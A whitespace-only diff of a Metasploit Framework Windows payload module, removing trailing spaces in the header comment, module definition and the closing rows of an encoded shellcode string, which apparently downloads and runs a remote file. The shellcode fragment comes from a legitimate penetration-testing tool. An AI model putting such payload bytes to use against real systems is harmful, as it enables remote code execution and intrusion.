@@ -3,7 +3,7 @@
 ##
 
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
@@ -15,7 +15,7 @@ require 'msf/core/payload/windows/exec'
 
 
 module Metasploit3
-	
+
 	include Msf::Payload::Windows
 	include Msf::Payload::Single
 
@@ -29,7 +29,7 @@ module Metasploit3
 			'Platform'      => 'win',
 			'Arch'          => ARCH_X86,
 			'Privileged'    => false,
-			'Payload'       => 
+			'Payload'       =>
 			{
 				'Offsets' => { },
 				'Payload' =>
@@ -54,10 +54,10 @@ module Metasploit3
 					"\xD8\x99\xCE\xF0\xF7\xDC\xE1\xFC\xFA\x99\xDC\xE1\xF0\xED\xCD\xF1"+
 					"\xEB\xFC\xF8\xFD\x99\xD5\xF6\xF8\xFD\xD5\xF0\xFB\xEB\xF8\xEB\xE0"+
 					"\xD8\x99\xEC\xEB\xF5\xF4\xF6\xF7\x99\xCC\xCB\xD5\xDD\xF6\xEE\xF7"+
-					"\xF5\xF6\xF8\xFD\xCD\xF6\xDF\xF0\xF5\xFC\xD8\x99"	
+					"\xF5\xF6\xF8\xFD\xCD\xF6\xDF\xF0\xF5\xFC\xD8\x99"
 			}
 			))
-			
+
 		# EXITFUNC is not supported :/
 		deregister_options('EXITFUNC')
 
